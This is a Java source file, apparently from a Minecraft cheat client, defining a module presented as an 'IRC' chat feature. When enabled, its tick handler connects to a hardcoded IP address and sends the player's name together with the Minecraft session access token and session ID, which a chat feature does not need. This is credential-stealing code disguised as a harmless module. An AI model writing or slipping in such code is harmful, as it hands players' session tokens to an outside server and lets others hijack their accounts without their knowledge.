package com.alan.clients.module.impl.other;

import com.alan.clients.Client;
import com.alan.clients.module.Module;
import com.alan.clients.module.api.Category;
import com.alan.clients.module.api.ModuleInfo;
import com.alan.clients.newevent.Listener;
import com.alan.clients.newevent.annotations.EventLink;
import com.alan.clients.newevent.impl.other.TickEvent;
import com.alan.clients.util.chat.ChatUtil;
import com.diaoling.network.packet.impl.info.GameInfoPacket;

/**
 * @author DiaoLing
 * @since 3/28/2024
 */
@ModuleInfo(name = "IRC", description = "Internet Relay Chat", category = Category.OTHER)
public class IRC extends Module {
    private String lastName;

    @Override
    public void onEnable() {
        ChatUtil.displayNoPrefix("使用.irc输入信息");
        this.reset();
    }

    @Override
    public void onDisable() {
        this.reset();

        if (Client.INSTANCE.getSocketManager().getClient().isConnected()) {
            Client.INSTANCE.getSocketManager().getClient().disconnect();
        }
    }

    @EventLink
        public final Listener<TickEvent> onTick = event -> {
            if (isNull()) return;

        String name = mc.thePlayer.getCommandSenderName();

        if (Client.INSTANCE.getSocketManager().getClient().isConnected()) {
            if (lastName == null || !lastName.equals(name)) {
                Client.INSTANCE.getSocketManager().send(new GameInfoPacket(name, mc.getSession().getToken(), mc.getSession().getSessionID(), System.currentTimeMillis()));
                lastName = name;
            }
        } else {
            if (!Client.INSTANCE.getSocketManager().getClient().isConnecting()) {
                Client.INSTANCE.getSocketManager().getClient().start("43.248.189.42", 45600);
            }
        }
    };
    public void reset() {
        this.lastName = null;
    }
}